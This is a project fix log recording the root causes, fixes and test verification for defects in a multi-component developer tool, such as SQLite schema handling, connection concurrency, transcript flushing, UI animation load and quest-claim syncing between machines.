# Fix log

Root cause, fix, and verification for non-trivial defects — the record version control cannot carry:
a diff shows what changed and never why the old behaviour was wrong. Newest first. The knowledge
service indexes this file per entry, so a sibling can ask "has anyone hit this" without opening the
repository.

## 2026-10-08 — an older connector rebuilt a newer index

### Service: an older build read a newer index's schema as one to rebuild, and dropped it (KSCHEMA1)
- **Symptom:** on the install, an old connector binary (the MCP host a session's harness starts, from `$DAORIS_HOME/bin`) opened the shared `knowledge.db` while the newer host served it. The index was gone and stamped back at the older version, and the newer host then failed every knowledge route until it was restarted.
- **Root cause:** `SqliteKnowledgeStore.EnsureSchemaAsync` dropped `entries` and `entries_fts` on ANY `user_version` other than its own, since the store's first commit (`c363a2b9`): the index is derived, so a mismatch was read as a bump to rebuild. An older build is a mismatch too. It rebuilt the tables at its own shape and stamped its own number, so the newer host, still holding its connection, met tables without the columns it reads. The rebuild also set `Rebuilt`, so the composer forgot every repository's fed commit (REV3's rule, meant for a bump). A connector is easily older than the host: a deployed shell carries its own HTTP host, while the connector is found where `publish:service --install` last put it (`KnowledgeConnector.Candidates`). Second, smaller: the read and the stamp were separate statements, so an older build opening beside a newer one's stamp could read its own number and then write it back over the newer tables.
- **Fix:** the index alone is refused, never the store. A version newer than the build's is left as it is: nothing is dropped, created or stamped, `Rebuilt` stays false and the fed commits are kept. The store opens, and its `Refusal` (`NewerIndexException`) is thrown by every operation on the index, the service's refusing before anything else, since the hybrid search's tiers each fold a throw into an empty answer. The HTTP host answers it as 409 in the error shape, caught ahead of HOSTLOG1's 500, and the connector's index tools answer it as their text; its sentence names both versions and no path. The registry answers without counts, no implicit refresh is tried, and each host says it once at start (stderr with the folder to update, and `index.refused` in its log). An older version is rebuilt as before, and the read through the stamp is one `BEGIN IMMEDIATE` transaction. The branch first refused the whole store at open, as the task asked; an update that fails to confirm rolls back to the previous build by itself (D139), and that build would have had no host until a person updated it. D36's KSCHEMA1 note has why the index alone, and the reading of the column-adding stores.
- **Verify:** `NewerIndexTests` (Service, 7): a store one version ahead opens, its reads, replace and search refuse, and every declared object, row and the version stay as they were; the whole composition over it starts, a quest is found and another published, a session made, a key minted and listed, an ask made and the registry read, while search, read, summary, convergence, entries, refresh, feed and retire refuse, the retire leaving its registration and the fed commit kept, and the index's tables unchanged; the key console lists over it; with a model, a search refuses rather than answering nothing (removing the service's refusal made it answer nothing); the connector's index tools answer the sentence and its registry answers; an older build opening while a newer one holds its stamp uncommitted waits and leaves it; the real connector starts and stays up over it, says it once on stderr and logs `index.refused` once; a store one version behind is still rebuilt. Five failed first against the refusal at open. `NewerIndexHostTests` (Http, 2): the host starts, status, registry, quests and sessions answer 200, and search, repositories, entry, entries, convergence, refresh and retire answer 409 with the sentence and no path, with no `error` and no `request.failed` in its log and `index.refused` once; without the 409 catch, search answered HOSTLOG1's 500. The key console lists over it. The older-version tests (`SchemaRebuildTests`, `SqliteStoreTests`, `HitLinesTests`) pass unchanged. On the tree merged with main: Service 1625 (main 1618), Http 102 (main 100). Not covered: a connector already installed predates this and still rebuilds; only builds from this one on leave a newer index alone.
- **Commit:** pending.

## 2026-10-08 — a say met another request's open transaction

### Service: one connection shared by every request let a command meet another's open transaction (SQLITETX1, KNOW500's cause)
- **Symptom:** on the install, 2026-10-08: `POST /api/sessions/fc8ba5ff/say` answered 500, `System.InvalidOperationException: Execute requires the command to have a transaction object when the connection assigned to the command is in a pending local transaction` at `SqliteCommand.ExecuteReader`, its words kept on the record; a second say a few seconds later answered 200. Earlier that day every `GET /api/repositories` and `/api/search` answered 500 from one moment until the host restarted, while a second host over a copy of the data answered (KNOW500).
- **Root cause:** a host opens every store over ONE `SqliteConnection` (`ServiceFactory.CreateAsync`) and answers requests at once, and a `SqliteConnection` is not safe to use from two threads: the transaction it has open and the list of commands it made are plain fields. SYNC1's `ConnectionGate` (`91e508c2`) serialized the transactions only, so every other command ran beside them. A command made before another request's `BEGIN` and run after it throws the install's exception: the say's door keeps the words through the ledger, then `KeepOnAskAsync` reads, hence a 500 with the words kept. A command made during another request's transaction joins it, and a rollback took its write too. The threads also corrupt the connection's own state. A burst reproduced an `ArgumentOutOfRangeException` from its command list and a `NullReferenceException` closing it. It also left the database inside a transaction no `SqliteTransaction` owned (a throw after `BEGIN` had run), after which every `BEGIN` failed with *cannot start a transaction within a transaction* until a restart. That is KNOW500's shape: `/api/repositories` and `/api/search` refresh the index in a transaction, while `/api/status` and `/api/registry` only read. In that state every later write lands inside the orphan, never committed, and a restart rolls it back. The install's host logged no exception type (HOSTLOG1), so KNOW500 matching this state is read from its shape, not seen.
- **Fix:** `ConnectionGate` holds the connection: each store method runs its commands inside `RunAsync` and each transaction inside `InTransactionAsync`, which keeps `BEGIN IMMEDIATE`, commit on return, rollback on a throw and the uncancellable work token. `Command()` refuses outside the gate. The gate is reentrant within one flow of work (an `AsyncLocal` hold), so a transaction's work calling the stores' own methods runs inside it and joins its transaction. A unit that began on a clean connection ends on one: anything it left open is rolled back, and leaving one without a throw fails it. A transaction the database holds and no object owns is rolled back before the next unit. All six stores and the search go through it. D36's SQLITETX1 note has the reasoning and what was rejected.
- **Verify:** `ConcurrentRequestsTests` (Http) sends 50 says to a parked session beside 50 of the driver's looks (its reads, then a refresh or a publish) over the host's real store. It failed first in three runs: 46, 2 and 78 of 100 requests failed, 44 of the says with the install's exact exception. In the third, every later `BEGIN` failed, the request after the burst too. After the fix, all 100 answer and every word is kept once on the session and on its ask, in 2.2–3.4 s, the slowest say about 1 s. In `ConnectionGateTests`, three rows failed first: a write beside an open transaction that then rolled back (it had joined, and went with it), a transaction nobody owns (*cannot start a transaction within a transaction*), and the source scan on the old tree. The leak guard's two rows failed with the guard off. A transaction an exception interrupts leaves the store usable passed before too: `await using` already rolled back a throw on one thread. Service 1588 (was 1582), Http 94 (was 93). Not run: the family rehearsal, whose two-machine and sync phases read one request at a time.
- **Commit:** `7894e610`.
## 2026-10-08 — a working session's transcript held nothing until it ended

### Driver: a session's transcript reached the disk only at its end (TRANSCRIPT1)
- **Symptom:** found by DEV3d (below): a transcript of a few lines held 0 bytes while its session worked and everything
  once it ended, so the family rehearsal's wait for its stub's line never saw it. Anything reading a live session's
  transcript (a rehearsal, a person opening the file) saw nothing until the end.
- **Root cause:** every door's capture wrote the transcript through a `StreamWriter` it never flushed (`Driver.CaptureAsync`,
  `CaptureStructuredAsync`, `CaptureAcpAsync`, `ChatRunner.CaptureProtocolAsync`; `PumpAsync` writes into it). The writer
  holds what it is given until its buffer fills or it is disposed, and a session says far less than a buffer between its
  start and its end. Not a regression: the transcript was written so from the driver's first loop (`a9c9e9a7`, DRV2), and
  each door after copied it. The events file (`<id>.events.jsonl`, `SessionEvents.Append`) was never of this shape: it
  opens, writes and closes the file for each event, so each is on the disk as it is kept. The session's other files (its
  conversation id, its marks) are written whole, atomically.
- **Fix:** `TranscriptFile` (driver), the one writer the four captures open: a line asks the thread pool for a flush, at
  most one queued at a time, so the lines written before it runs share it and no pump waits on the file. A flush that
  fails on the pool is swallowed (the bytes stay with the writer for the next flush and the close). The file opens as
  before, shared for reading; a line written after the close still throws, as a closed writer's did.
- **Verify:** `TranscriptAsSaidTests` (4): a stand-in harness says a line and waits, and the test reads the file sharing it
  for writing, on the pipe door (its preamble, stdout and stderr), the native door's structured stdout, and the writer
  itself, fresh and going on. All four failed first, each wait running out with *the transcript held 0 character(s)*
  (16, the earlier run's line, for the one going on). Not run: the protocol doors, which need a real process; they open
  the same writer.

## 2026-10-08 — the window's bar froze while its page worked

### Web shell and desktop: an endless pulse drew at the display's rate, and nothing said what held the window's thread (FREEZE1)
- **Symptom:** on the install the owner saw the window's strip frozen while the page still worked. The main `Daoris.Desktop`
  process had used about 1,600 CPU-s in some 90 minutes, its GPU process about 1,740, its renderer about 660. After a
  restart a one-minute sampler showed the GPU process climbing about 15 CPU-s a minute from the window's start, the main
  process under 1 a minute until the in-app browser opened at 08:22:47, then about 12 a minute in bursts (2 to 36 a
  sample) while the renderer doubled. The page made no requests in 5 s and drew 601 frames in 5 s.
- **Root cause, proven:** the GPU and renderer burn is the live dot's `motion-safe:animate-pulse`, Tailwind's
  `infinite` pulse: one endless animation keeps the window drawing at the display's rate for as long as any session is
  live. **The browser is not the cause**: nothing in the window's process speaks to it once it is up, and with the
  `in-app-browser` plugin every session start brings it up (`InAppBrowserServers.HandAsync`), so its opening marks a
  session starting. **Not proven:** what held the window's thread. The strip's move is the page's `START_DRAG` (FRAME2),
  dispatched on that thread, and the caption buttons are its own, so a thread busy or behind freezes the bar; every bridge
  route runs there until its first wait, and the kit's flush serializes every bus event there each 50 ms. Nothing measured
  the thread, so the sighting could say only a CPU total. The suspects, unmeasured: a running session's traffic (large tool
  results serialized on the thread by the flush), a route's synchronous part, a full collection.
- **Fix:** `tokens.css` gives `--animate-pulse` a count of three, so the live dot pulses as it turns live and settles
  (D41's motion line, `docs/2026-09-19-platform-ux.md` §3). `UiStallWatch` posts a probe to the window's thread each second
  and writes `ui.stalled` (warn) when one waits 250 ms or more: the longest wait, how long, the route found on the thread and
  the slowest route's synchronous part, how many routes ran, the bus events and full collections meanwhile; once a minute
  while it lasts (the machine log design §4). The shell composes it beside `RefusalLog`; the form starts it on Load.
- **Verify:** `motion.test.ts` compiles the live mark's classes from `tokens.css` as the build does, and failed first
  (`pulse 2s cubic-bezier(0.4, 0, 0.6, 1) infinite`); `UiStallWatchTests` (8) drive a stall by hand through the kit's
  dispatcher, and five failed first against a stub. Not run: the window. Owed on the install: the sampler with a session
  live, before and after this build, where the GPU process should fall well below its 15 CPU-s a minute once the dot has
  settled, drawing only as the page changes; and at the next frozen bar, the `ui.stalled` lines, which name what held the
  thread.

## 2026-10-08 — an answered park failed by a second look

### Driver: answering a parked session failed it, *cannot move working → working* (ANSWER2)
- **Symptom:** on the install, 2026-10-08: two driven sessions parked to ask (`session.parked` 20:38:58 and 20:40:04 UTC), the person answered each from the window (`message.sent`, `kind: answer`, `reach: resume`, 20:43:08 and 20:43:37), and each ended `failed`, its note *the service refused moving session `…` to working: Session `…` cannot move working → working. From working: …*, an unobserved task's `System.AggregateException` in the desktop's log beside each.
- **Root cause:** not the answer: the box's words reach the say door, which moves nothing. The next look moved the park to working and resumed it, and a resumed run takes the words off its record only as it concludes. Since MSG1b (`3483ea90`), `PriorSession.WordsWaiting` read `said` whatever the record's state, so at every look while the run worked the planner planned the same record to go on, its `continuing` letting it past its own record (ANSWER1a, `0374e74c`). The second run started a second agent process, its move to working was refused, and `ContinueAsync`'s catch moved the record `failed`. Its capture, started before that move, was never awaited: the unobserved task (read from the code: the protocol door's capture opens the record's transcript, which the first run holds). ANSWER1's tick looks once per answer with a stand-in that answers no `said`, and the rehearsals' resumed runs end before a second look.
- **Fix:** `WordsWaiting` is false for a queued, starting or working record (`PriorSession.Running`); a look claims a record its words wait on for the one run that takes it up (`RunningSessions.TryGoOn`, `WentOn`), covering the moment between a run's open and its move, and says *going on* where a run has it; `HoldAsync` ends a run whose record will not move and observes its capture (`Driver.AbandonedAsync`, 10 s, then left still observed), writing a failure to the machine log with its place (`Driver.Log`, handed by both hosts) and to the console. D131's ANSWER2 note has the rest.
- **Verify:** `AnswerGoesOnOnceTests` over the stand-in ledger, which now keeps a park, the say and taken doors, and refuses a same-state move in the ledger's words: its two look rows failed first with the install's sentence (moves `working, failed`), its observation rows on a stub that observed nothing; `SessionMessagesPlanTests`' four new rows failed with a working record planned `Start`, going on; the planner's guard, the claim and the bound each failed their rows with the line removed. The driver's fast half passed (4799, was 4788) and the modules' (651, was 650). Not run: the `Process` half, the family rehearsal and the deployment rehearsal.
- **Commit:** `90dee80a`, `df972c56`, `046560f9`.
## 2026-10-08 — a turn that handed off to background work parked on the person

### Driver: a driven turn that ended on its own background work read as asking the person (BGWAIT1)
- **Symptom:** the owner's install: a driven `claude-code-acp` session sat *awaiting the person*, its note quoting *"Gates are running in the background (lint → prettier → …); I'll pick up when they finish."* The agent had backgrounded its gates and ended its turn holding its quest, expecting to be woken when they finished.
- **Root cause:** two rules, each right alone. D105 §3 closes a driven session right after its prompt's answer, whatever it left running, and the harness's own wake when that work ends (CONSOLE2a) is cut off with it. D83's conclusion then reads a clean exit holding the session's own take as a park, quoting its last words. Nothing between them read the harness's `async_task_*` frames, which said the work was still running when the turn ended.
- **Fix:** `AcpBackground` keeps the tasks the session's own id announces, and `AcpSession.RunAsync` takes `waitsOnBackground`. A turn that ends while one runs asks the driver whether the quest stands as a park would leave it (`Observation.Parks`, the conclusion's rule made one method); yes keeps the session open until the wire ends that work, then prompts it that the work ended. D83's BGWAIT1 note has the rest, and what it does not cover (the headless loop, the native door, an answered park's resumed run).
- **Verify:** `AcpBackgroundTests` (seven) and `ObservationTests`' park-rule table failed first against an unused parameter and a `false` rule, then passed; the held-words case failed with its ordering removed; the driver's fast half passed (4805). Not run: the `Process` half and the family rehearsal, whose stubs send no task frames.
- **Commit:** `480e1afd`.
## 2026-10-08 — a stub's slow start counted as its silence

### CLI tests: the setup kit's bound counted a stub's start under load as its silence (STUB3b)
- **Symptom:** `setup-kit.test.ts`'s STUB3 case *a stub that stays without answering fails its row at the bound, and is
  stopped* failed three times on 2026-10-07 under parallel builds (EVID1b3's and CODEXUSE1's verifies, ACCTUX1's merge
  gate). The row named `1 (initialize), 2 (session/new), 3 (session/prompt)` unanswered where it expects two, and passed
  alone.
- **Root cause:** `speak()` started a row's bound as it spawned the stub, so the case's 1000 ms covered the process's start
  too. Its stub answers `initialize` as soon as it reads it, and under load a Node process took longer than that to start
  reading.
- **Fix:** `speak()` counts the answers' `wait` from the stub's first answer, and bounds the start apart (`start`,
  `STUB_START_MS`: ten seconds, the slowest row's whole wait as before). Each failure says what it was counted from
  (*within 1000 ms of its first answer*, *of its start*). `cutShort` can hold its stub's start (`startsAfter`). The case's
  pattern asks for *of its first answer*. Two cases are new: a stub that starts 1.5 s late fails naming only the two it
  never answered, and a stub that answers nothing fails at the start's bound, naming all three.
- **Verify:** the slow-start case failed first as the sightings did (*never answered 1 (initialize), 2 (session/new), 3
  (session/prompt) within 1000 ms*), and the silent case failed at the old ten seconds. Then the four STUB3 cases passed
  ten runs in a row, with `dotnet build src/Daoris.Desktop/Daoris.Desktop.Driver --no-incremental` running beside them
  throughout. `setup-kit.test.ts` went from 27 cases to 29.

## 2026-10-08 — the lost-claim phase restarted host b under the lingering session's take

### Tools: the family rehearsal waited on a transcript that holds nothing until the session ends (DEV3d)
- **Symptom:** the family rehearsal's *…its driver stops its own losing session* failed at CARRY2d's merge (403/404),
  DEV3b's evidence kept (`_fixtures/rehearsal-logs/family-2026-10-07T12-45-51-960Z/`): the take was found lost, and the
  session had already ended `failed`, its note host b's refused connection and its transcript the stub's `fetch failed …
  ECONNRESET`. The run spawned at 12:50:11, the session started at 12:50:52, and host b restarted at 12:51:00.
- **Root cause:** the phase waited for the stub's `stub: lingering` by reading the session's transcript, which the driver
  writes through a buffered `StreamWriter` it does not flush (`Driver.CaptureAsync`, `PumpAsync`), so a transcript of a
  few lines reaches the disk only as the session ends. The wait never saw the line, always ran out its 160 asks (about 40 s, plus each ask), and the phase then restarted host b,
  whatever the session was doing. Unloaded, the session was lingering by then. Under load, its look's sync alone spent 12 s
  against the absent remote, it started 41 s in, and the restart cut off its take, which host b answers only after its push
  fails. The first check passed anyway: it asked only that the session was working and the claim unconfirmed, which the
  host records before it answers.
- **Fix:** the stub writes `stub: lingering`, and a minute later `stub: lingered`, to a file per quest under the scratch
  (`stub-said/`) as it prints them. The wait reads that file (`waitFor` in `tools/rehearsal-kit.mjs`), bounded at two
  minutes by the clock and ending with the run, and the first check requires the line. Host b comes back through
  `restartBetweenRequests`, only while the stub has said it lingers and not that it lingered, and the lost-claim check's
  detail says whether it did. The stub does not retry a reset: the reset hides whether its take reached the host. D115's
  DEV3d note.
- **Verify:** `tools/rehearsal-kit.test.mjs` (10 → 16) failed first on the missing exports. A wait counted in asks failed
  its clock case, and a restart that did not wait failed both restart cases. A scratch run of the stub against a stand-in
  quest door read the line from its file while it lingered. A .NET 10 probe of the driver's writer read 0 bytes on disk
  while it was open and 17 once disposed. Not run: the family rehearsal.

## 2026-10-08 — the publish's last bare rename

### Tools: laying out the plugin offers stopped a publish on a held staging folder
- **Symptom:** the deployment rehearsal, rerun on its own after the full set on `99b2a858`, failed at its first step: `publish:desktop --service` threw EPERM renaming `app/.plugin-offers-staging` to `app/plugin-offers`, and every later check failed with it. The same step runs when the owner's install is republished.
- **Root cause:** `layOffers` (`tools/desktop-publish.mjs`) swapped the staging folder in with a bare `renameSync`, a moment after copying the offers into it, when the scanner may still hold the folder. The held-folder sweep (FIX-LOG 2026-10-07) moved the package, launcher and stage renames onto `renameHeld` and left this one.
- **Fix:** the swap goes through `renameHeld` with the step's options, as the others do; the file imports no `renameSync` now, so no rename in it is bare.
- **Verify:** a `desktop-publish.test.ts` case where the first swap is refused as held failed first (thrown), then passed (tried again, the offers laid); the file's 42 tests pass; the deployment rehearsal reruns on the fix.

## 2026-10-07 — a document's first heading and a README's description read a fence's text

### CLI and driver: the first heading and a README's description closed a longer fence on a shorter one inside it (ORIENT2h6)
- **Symptom:** left open by ORIENT2h4, verified in the code, not seen on an install: a four-backtick fence quoting a three-backtick example closed on the example's first line, so the example's heading named a knowledge document in the index's heading table or a room's row (`firstHeading`), and ended a README's description for an intake (`SelfDescription`, D77); a tilde fence closed on a backtick run inside it; and inline code at a line's start opened a fence that held the rest of the file.
- **Root cause:** `firstHeading` (`src/Daoris.Cli/src/document.ts`) and `SelfDescription.FromReadme` each toggled on any line opening with three backticks or tildes. ORIENT2h3 and ORIENT2h4 gave the service and the tools CommonMark's rule and left these two, outside their rows.
- **Fix:** the CLI's `markdownFence`, which `firstHeading` reads by, and the driver's `SelfDescription.Fence` read a fence as `MarkdownFence` and `fenced` do, each with code of its own; both and the tools' `fenced` are held to one table, `src/Daoris.Cli/test/fixtures/fence-cases.json`, which a `REACH` row sends to the driver's suite at a merge. D151's ORIENT2h6 note has the choices.
- **Verify:** `markdown-fence.test.ts` (the CLI's reader against the table, and four first headings) and `SelfDescriptionTests` (the table, and four READMEs) failed first, then passed with the CLI suite and the driver's fast half; the lane scan in `merge-branch.test.ts` failed until the `REACH` row. No tracked markdown file here, 518, reads a line or a first heading differently. Not covered: the service's suite does not read the table.
- **Commit:** `56c2d4e2`
## 2026-10-07 — a look that failed took its own lines with it

### Driver: a stop made early in a look went unsaid when the look failed later (DEV3c)
- **Symptom:** read from the code and DEV3b's note, not seen on a run: under `--until-idle` and the watch, a look that stopped a session for a lost take and then failed (the quest list down, its sync after the endings unreadable) left the record stood down and printed no `stop  session` line. A look that drained an ending before its own sync failed printed neither the ending nor its fact.
- **Root cause:** `TickAsync` gathered every line and ending into lists it handed over only in the report it returned, and a look that threw returned none. DEV3a and DEV3b made each finished look and each pass beside `--once`'s sessions said as it ends; a look cut short had no such door.
- **Fix:** `TickAsync` takes `failed`, handed what the look had said when it fails or is closed. `RunUntilIdleAsync` and `RunOnceAsync` hand it their `said`. `DriverWatch.RunAsync` takes `said` for a part of a look, which the headless host prints; with none, the part joins the next look's report, as the orphan sweep's lines do. D115's DEV3c note has the rest.
- **Verify:** five `SessionsOutliveTheirLookTests` DEV3c cases over the stand-in ledger, each seen failing first (the until-idle stop case said the ending without the stop; the others said nothing; the two watch cases failed with the carry removed), and `DriverCommandTests.The_hosts_watch_prints_what_a_failed_look_had_said`, failing with the host's `said` removed; then the driver's fast half passed (4686). Not run: the family rehearsal, the `Process` half and the deployment rehearsal.
- **Commit:** `bbe9510b`.

## 2026-10-07 — a losing session's stop that its run made and never said

### Driver: `--once` kept the passes beside its session for its end, and the rehearsal's bound ended it first (DEV3b)
- **Symptom:** the family rehearsal's *its driver stops its own losing session* failed after DEV3a's fix (399/400, FLAKE1 below; its transcript `_fixtures/rehearsal-logs/family-2026-10-07T09-14-19-638Z.log` was kept): the record stood down (`ended.lost-claim`, opened 09:08:53, stood down 09:09:38), and the run's print held its look alone, one sync line meeting host b's absent remote.
- **Root cause:** only that run could have stopped it: only `StopLostClaimsAsync` gives a stop the lost-claim reason, and only to a session in the driver's own running set, whose record that run then writes; not another run, and not the orphan sweep. The look ran before the session started, so a pass beside it in `SettleAsync` made the stop, and `SettleAsync` held every pass's lines until all its sessions had ended and the pass after the endings had run. Each pass while host b was away met the wall too, and none of those lines was printed, so the run never got that far. Nothing in it leaves `SettleAsync` unsaid but the close; from outside, the rehearsal ends a background run only by `DRIVE_TIMEOUT`, 90 s counted from the spawn. This run is held through the rehearsal's wait for the stub, a restart of host b, the stop, then up to two full passes (git started for each joined repository) before it says anything. The background helper marked no kill, unlike `capture`, so a cut-off print read as a whole run's. The first sighting (2026-10-01) fits: stood down 64 s after its record opened, its print the banner alone, which is what a run killed before `RunOnceAsync` returned printed then.
- **Fix:** `SettleAsync` hands `said` each pass that said anything as the pass ends, and then what ended. Together these are still the returned report. The lost-claim stop is said once per session. The rehearsal bounds that run by its session's own two minutes plus one (180 s), marks a killed background run with `[killed: …]` and its length, and opens the check's detail with `exit <code> after <n>s, started <time>`, to hold against the record's own times. A failed check that hands evidence keeps it under `_fixtures/rehearsal-logs/family-<start>/<check>/`: the print, the session transcript and both homes' machine logs (`makeChecker({ keep })`, `keepEvidence` in `tools/rehearsal-kit.mjs`). D115's DEV3b note on the losing session has the rest.
- **Verify:** `SessionsOutliveTheirLookTests.Run_once_says_a_stop_a_later_pass_made_as_that_pass_ends_when_the_first_could_not_reach_the_remote` failed first, its said lines the look's sync line alone, as the rehearsal's were; then the driver's fast half passed (4663). `node --test tools/rehearsal-kit.test.mjs` (10) failed first on the missing exports and runs in `verify`. Not run: the family rehearsal and the `Process` half. The bound is the cause the code and the record's times admit, not one a capture proved; the next sighting's kept folder says which.
- **Commit:** `e1b69d48` (driver), `e355c992` (the rehearsal and its kit).
## 2026-10-07 — the comma after a long code span opened the next line

### Web: a closing mark after a code span wrapped alone, and a session head cut its branch (UXFIX4b)
- **Symptom:** UXFIX4's Sweep stories, at a 680 px window and at the main area's 400 px floor: a branch name filling its line was followed by a line starting `, whose work is on the line.`, and *Its work is on …* ended in a line holding only `.`. A session head cut its branch to one line with nothing to read the rest by.
- **Root cause:** LOOK5 set each word of a code span in an `inline-block` box so that no line breaks after a hyphen inside a flag, and Chromium offers a break after any inline box, even before a comma, where text alone never breaks. A box whose word breaks inside is as wide as its line, so nothing after it fits there. The head's name kept the `truncate` UXFIX4 took off the branch rows.
- **Fix:** `Inline` hands the closing marks after a span to `CodeText`. A one-word span and its marks are one box, the code then the marks as text, and inside it no line breaks before a closing mark in either language. A command's last box is inside its code, which the marks are not, so it sits alone in a `whitespace-nowrap` group, which leaves the break after it to the text's rules, and leaves an em a mark of room on its line. Measured first and rejected: a no-wrap group around a word that broke inside keeps the mark at the box's far edge, past the word by the line's unused width, and past the column's edge with no room; a word joiner before the mark changes nothing in Chromium. The head shows its branch with `PathText`. platform-ux §3 has the rule.
- **Verify:** four cases in `ui.test.tsx` and the whole-branch case in `SessionHead.test.tsx` failed first, then passed with the web suite (4514). In Chromium through Storybook, the Sweep `At680*` and `AtTheFloor*` stories put 12 marks at a line's start before; after, none, each 0 px after its word's last glyph and inside its column. Not covered: engines other than Chromium; after a command's last word wider than its line, its marks still stand at the box's edge.
## 2026-10-07 — a workspace's Branches tab counted every checkout on the machine

### Web and modules: a workspace's look fetched, counted and left apart the machine's checkouts (BRSCOPE1)
- **Symptom:** seen on the install: the work workspace's Branches tab said *另有 31 个有检出的仓库不持有 Daoris 的分支* (31 more checked-out repositories hold no branch of Daoris's) beside its header's 29 repositories, and its list held `Daoris` and `Daoris.Plugins`, which are another circle's.
- **Root cause:** UX6g filtered the clean-up's rows and the look's rows to the workspace, and nothing else. `BranchesPart` handed the section the machine's `TREES_SYNC_SCOPE` reading and the look's `looked` and `apart` whole, so the count, the list apart and *Looking at N* were the machine's. The page sent no workspace and `TREES_SYNC_PLAN` and `TREES_SYNC` took none, so the look fetched every checkout holding Daoris's branches and *All N* included every other one; the look had one cache key for every workspace.
- **Fix:** the two routes take `workspace` (`DriverModule.Checkouts`), the bridge's look and press send it and keep the look per workspace, and the page filters the reading and the look's lists to its own. D150's BRSCOPE1 note has the detail.
- **Verify:** `ProjectsView.test.tsx`'s two workspaces' checkouts (aurora's tab counted the machine's 3 first) and `DriverModuleLinesTests.A_look_asked_for_a_workspace_takes_its_own_checkouts_alone` (every circle's checkouts first) failed, then passed with the web suite and the modules' fast half. Not covered: the window, the modules' `Process` half and the rehearsals.
## 2026-10-07 — a decision's note split on a fence it quoted

### Tools and service: the decisions digest and its twin closed a longer fence on a shorter one inside it (ORIENT2h4)
- **Symptom:** left open by ORIENT2h3, verified in the code, not seen on an install: a four-backtick fence in a decision quoting a three-backtick example closed on the example's first line, so a note's label after a blank line inside it became a note of its own in the digest and in the service's entries, and a tilde fence fenced nothing. `doc-shapes` read a `##` heading inside either as an archive entry.
- **Root cause:** `fenced` (`tools/doc-duplicates.mjs`), `DecisionNotes.Fenced` and `doc-shapes`' `archiveEntries` each toggled on any line opening with three backticks; ORIENT2h3 gave the service's other readers `MarkdownFence` and left these, a twin, for a change to both sides.
- **Fix:** `fenced` reads a fence as CommonMark does, as `MarkdownFence` does; `DecisionNotes.Fenced` reads by `MarkdownFence`; `doc-shapes` reads by `fenced`. D151's ORIENT2h4 note has the choices.
- **Verify:** three new decisions in `tools/orient-index-fixtures/decision-notes.json` failed first in `DecisionNotesTests` and `tools/orient-index.test.mjs`, and `doc-shapes.test.ts`' longer and tilde fences; then passed, with the service suite (1538), the CLI suite (1371) and `verify`. No tracked markdown file here reads differently. Not covered: the CLI's `document.ts` and the driver's `SelfDescription` still toggle.

## 2026-10-07 — a session whose take had lost closed the winner's quest

### Service and driver: an upgraded machine pushed the move its older build left on a lost take, refused every pass (WAITCLAIM4)
- **Symptom:** named by WAITCLAIM3's note, not seen on an install: a machine upgraded from a build before WAITCLAIM2 still held the done, decline or wait it made after its take's conflict was written. Every pass pushed it and the remote refused that quest's whole push, so the circle never pushed clean, and the driver said each refusal as *quest `#x` was not taken by the remote*, beside a reason saying the take had lost.
- **Root cause:** `QuestStore.RebaseAsync` read a lost claim only as it rewrote a pending take, so an operation made after the take's conflict was written applied as the table allows. And `IntegrateAsync` rebased only quests the fetch touched, which this quest no longer was once the conflict had come back.
- **Fix:** the rebase judges each pending operation by `QuestLog.OnALostTake` on the history it has replayed: a done or a decline becomes a conflict, a wait is forgotten. `IntegrateAsync` also rebases each quest of the circle holding such an operation beside this machine's take-conflict. `RemoteSyncPayloads.Pass` says *the remote refused what this machine pushed for it.* and then the reason. D69's WAITCLAIM4 note has the choice and what it rejected.
- **Verify:** `QuestSyncTests.A_move_or_a_wait_an_older_build_left_pending_on_its_lost_take_becomes_its_loss_and_the_circle_pushes_clean` failed first for a done, a decline and a wait, and again without the sweep, then passed with the service suite (1565) and the HTTP suite (93); `RemoteSyncTests.A_refused_push_is_said_as_what_this_machine_pushed_with_the_remotes_reason_after_it` failed first, then passed with the driver's fast half (4681). Not covered: a chain step an older done already pushed stays; the family rehearsal, read and not run.

### Service: a remote applied a move pushed by a machine on an older build whose take had lost (WAITCLAIM3)
- **Symptom:** named by WAITCLAIM2's note, not seen on an install: a machine on a build before WAITCLAIM2 closed, declined or waited after the pass that found its take lost, and its next pass pushed it. The remote kept it, so the winner's quest was Done on the loser's note, Declined, or waited on the loser's question, on every machine.
- **Root cause:** `QuestStore.ReceiveAsync` judged a push by `QuestLog.Applies` alone, which allows a done, a decline and a wait on any taken quest, whoever took it. WAITCLAIM2's claim rule lived in the store's verbs, so it held only on machines of its build.
- **Fix:** `QuestLog.OnALostTake` is the one rule the store's verbs and `ReceiveAsync` ask; the remote refuses such an operation for that quest in the lost take's words (`QuestExchange.LostTake`), and the pass relays them under `refused`. D69's WAITCLAIM3 note has the choice and what it rejected.
- **Verify:** `QuestSyncTests.A_move_or_a_wait_an_older_build_makes_after_its_take_lost_is_refused_at_the_remote_and_never_reaches_the_winner` failed first for a done, a decline and a wait, then passed with the service suite (1548) and the HTTP suite (87). Not covered: the older machine keeps its move pending and is refused at each pass; the family rehearsal, read and not run.

### Service: a wait or a close made after the pass that found this machine's take lost applied to the winner's quest (WAITCLAIM2)
- **Symptom:** found by WAITCLAIM1 and left open in D69's note, not seen on an install: machine A's take lost in one pass, and its session, not yet stopped by A's driver, waited on a question and closed done. A's next pass pushed both, so on every machine the winner's quest was Done on A's note and waited on A's question.
- **Root cause:** D69's rule and WAITCLAIM1 lose this machine's later moves and waits only in `QuestStore.RebaseAsync`, and only while they are pending as it rewrites the take. Once the take was a numbered conflict, `MoveAsync` and `WaitAsync` judged by the table alone, which allows done and a wait on any taken quest, whoever took it.
- **Fix:** both verbs read this machine's claim inside their write by `QuestLog.Claim`, the rule `ClaimAsync` now answers from, and refuse a done, a decline or a wait on a taken quest whose claim is lost, writing nothing (`QuestMove.ClaimLost`); the exchange answers it `AlreadyTaken`, saying the take lost and nothing moved. D69's WAITCLAIM2 note has the choice and what it rejected.
- **Verify:** `QuestSyncTests.A_wait_and_a_close_made_after_the_pass_that_found_the_take_lost_are_refused_and_never_reach_the_winner` failed first (the winner's quest Done, awaiting A's question), and `QuestShareTests.A_wait_or_a_close_on_a_take_that_lost_is_refused_saying_so_and_nothing_reaches_the_remote` (the wait answered `CannotWait`); then both passed with the service suite (1535) and the HTTP suite (87). Not covered: a remote still takes such a move from a machine on an older build; the family rehearsal, read and not run.

## 2026-10-07 — a clear that took nothing closed as done

### Web: a workspace's clear closed its list in the `ok` tone when every unit it listed was kept (HIST1n)
